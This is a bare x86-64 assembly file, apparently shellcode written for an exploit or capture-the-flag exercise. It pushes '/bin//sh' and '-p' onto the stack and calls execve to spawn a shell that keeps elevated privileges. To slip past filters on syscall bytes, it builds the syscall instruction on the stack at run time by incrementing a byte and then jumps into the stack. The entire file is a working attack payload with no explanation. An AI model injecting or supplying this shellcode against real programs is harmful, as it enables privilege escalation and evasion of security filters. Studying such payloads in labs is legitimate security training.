.global _start
.text
_start:
.intel_syntax noprefix
	xor rax, rax
	
	push rax
	mov rbx, 0x702d
	push rbx
	mov rsi, rsp
	
	push rax
	push 0x6e69622f
	mov dword ptr [rsp + 4], 0x68732f2f
	mov rdi, rsp
	
	push rax
	push rsi
	push rdi
	mov rsi, rsp
	
	xor rdx, rdx
	mov rax, 59
	push 0x050e
	inc byte ptr [rsp]
	jmp rsp
    
